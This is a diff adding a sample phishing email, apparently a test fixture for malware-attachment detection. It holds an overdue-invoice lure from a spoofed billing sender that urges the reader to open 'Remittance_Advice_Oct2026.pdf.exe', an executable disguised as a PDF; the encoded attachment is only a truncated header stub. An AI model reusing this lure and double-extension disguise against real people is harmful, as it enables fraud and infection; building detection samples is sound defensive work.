@@ -1,0 +1,32 @@
+From: "Accounts Payable" <invoicing@vendor-billing-services.xyz>
+To: accounting@company.com
+Subject: OVERDUE INVOICE NOTICE: INV-884920 Remittance Advice Attached
+Date: Thu, 15 Oct 2026 14:10:00 +0000
+Message-ID: <inv-malware-20261015-1410@vendor-billing-services.xyz>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_Malicious_Attach"
+Received: from mail.vendor-billing-services.xyz (mail.vendor-billing-services.xyz [203.0.113.88])
+ by mx.company.com with ESMTP id 5Klm921
+ for <accounting@company.com>; Thu, 15 Oct 2026 14:10:04 +0000
+
+------=_Part_Malicious_Attach
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+Dear Client,
+
+Your account has an overdue invoice balance of $4,920.00 that requires immediate settlement.
+
+Please find your official remittance advice and payment receipt attached below.
+Review the attached PDF to avoid service interruption and late penalties.
+
+Accounting Services Department
+------=_Part_Malicious_Attach
+Content-Type: application/octet-stream; name="Remittance_Advice_Oct2026.pdf.exe"
+Content-Disposition: attachment; filename="Remittance_Advice_Oct2026.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+------=_Part_Malicious_Attach--
